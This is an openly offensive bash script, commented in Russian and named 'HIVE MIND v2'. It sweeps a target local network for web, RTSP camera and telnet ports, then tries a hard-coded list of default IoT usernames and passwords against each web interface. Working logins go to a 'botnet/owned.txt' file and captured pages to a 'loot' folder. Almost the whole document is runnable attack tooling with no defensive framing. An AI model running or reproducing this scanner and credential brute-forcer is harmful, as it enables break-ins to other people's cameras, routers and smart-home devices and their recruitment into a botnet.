#!/bin/bash
# HIVE MIND v2 — Рой для IoT (камеры, роутеры, умные дома)
TARGET_NETWORK=$1
[ -z "$TARGET_NETWORK" ] && { echo "Usage: $0 192.168.1.0/24"; exit 1; }
NETWORK=$(echo "$TARGET_NETWORK" | cut -d'/' -f1 | cut -d'.' -f1-3)
IOT_DIR="$HOME/.shadow_iot/$NETWORK"
mkdir -p "$IOT_DIR"/{devices,exploits,loot,botnet}

echo "╔══════════════════════════════════════════════╗"
echo "║   🦟 IOT HIVE — Рой для IoT устройств       ║"
echo "║   Камеры • Роутеры • Умные дома • TV        ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# Сканируем сеть на IoT устройства
echo "[IOT] 🔍 Сканирую $TARGET_NETWORK..."
for ip in $(seq 1 254); do
    timeout 0.5 bash -c "echo >/dev/tcp/$NETWORK.$ip/80" 2>/dev/null && echo "$NETWORK.$ip:80" >> "$IOT_DIR/devices/http.txt" &
    timeout 0.5 bash -c "echo >/dev/tcp/$NETWORK.$ip/554" 2>/dev/null && echo "$NETWORK.$ip:554 RTSP" >> "$IOT_DIR/devices/cameras.txt" &
    timeout 0.5 bash -c "echo >/dev/tcp/$NETWORK.$ip/23" 2>/dev/null && echo "$NETWORK.$ip:23 TELNET" >> "$IOT_DIR/devices/telnet.txt" &
done
wait

# Проверяем стандартные пароли IoT
echo "[IOT] 🔑 Проверяю стандартные пароли..."
IOT_CREDS=(
    "admin:admin" "root:root" "admin:12345" "admin:password"
    "root:admin" "admin:admin123" "root:12345" "admin:pass"
    "support:support" "user:user" "root:vizxv" "admin:888888"
    "root:xc3511" "admin:1111111" "root:Zte521" "admin:hi3518"
)

while read device; do
    ip=$(echo "$device" | awk '{print $1}' | cut -d: -f1)
    port=$(echo "$device" | awk '{print $1}' | cut -d: -f2)
    for cred in "${IOT_CREDS[@]}"; do
        user="${cred%%:*}"
        pass="${cred##*:}"
        curl -sk --max-time 3 -u "$user:$pass" "http://$ip:$port" -o "$IOT_DIR/loot/${ip}_${user}.html" -w "%{http_code}" 2>/dev/null | grep -q "200" && {
            echo "  💀 $ip:$port — $user:$pass РАБОТАЕТ!"
            echo "$ip:$port|$user:$pass" >> "$IOT_DIR/botnet/owned.txt"
        }
    done
done < "$IOT_DIR/devices/http.txt"

echo "[IOT] 🦟 Рой готов к развёртыванию"
echo "[IOT] 📁 $IOT_DIR/"
